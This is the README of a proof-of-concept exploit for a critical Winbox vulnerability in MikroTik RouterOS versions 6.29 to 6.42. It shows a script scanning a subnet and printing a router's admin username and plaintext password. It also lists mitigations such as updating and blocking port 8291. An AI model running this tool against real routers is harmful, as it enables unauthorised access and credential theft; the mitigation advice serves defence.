# WinboxPoC
Proof of Concept of Winbox Critical Vulnerability


## How to use
Run it :)
```
$ ./kerma.sh 172.17.17.0/24
172.17.17.17

User: admin
Pass: Th3P4ssWord

```
## Vulnerable versions
all versions from 6.29 (release date: 2015/28/05) to 6.42 (release date 2018/04/20) are vulnerable ..

## Mitigation Techniques
- Update your RouterOS to the last version or Bugfix version 
- Do not use Winbox and disable it :| it's nothing just a GUI for NooBs ..
- you may use some Filter Rules (ACL) to deny anonymous accesses to the Router 
```
ip firewall filter add chain=input in-interface=wan protocol=tcp dst-port=8291 action=drop
```

Enjoy!
